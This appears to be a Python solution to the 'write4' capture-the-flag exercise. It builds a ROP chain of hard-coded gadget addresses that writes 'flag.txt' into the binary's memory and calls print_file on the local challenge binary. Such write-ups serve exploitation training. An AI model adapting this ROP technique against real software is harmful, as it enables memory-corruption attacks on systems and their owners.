import struct
import subprocess

def main():
    elf = './write4'

    padding = b'A'*40
    flag_addr = struct.pack('<Q', 0x601a00)
    flag_strg = b'flag.txt'
    pop_r14_r15 = struct.pack('<Q', 0x00400690) + flag_addr + flag_strg
    mov_r14_r15 = struct.pack('<Q', 0x00400628)
    pop_rdi = struct.pack('<Q', 0x00400693) + flag_addr
    print_file = struct.pack('<Q', 0x00400620)

    payload = padding + pop_r14_r15 + mov_r14_r15 + pop_rdi + print_file

    p = subprocess.run(elf, input=payload)

if __name__=='__main__':
    main()
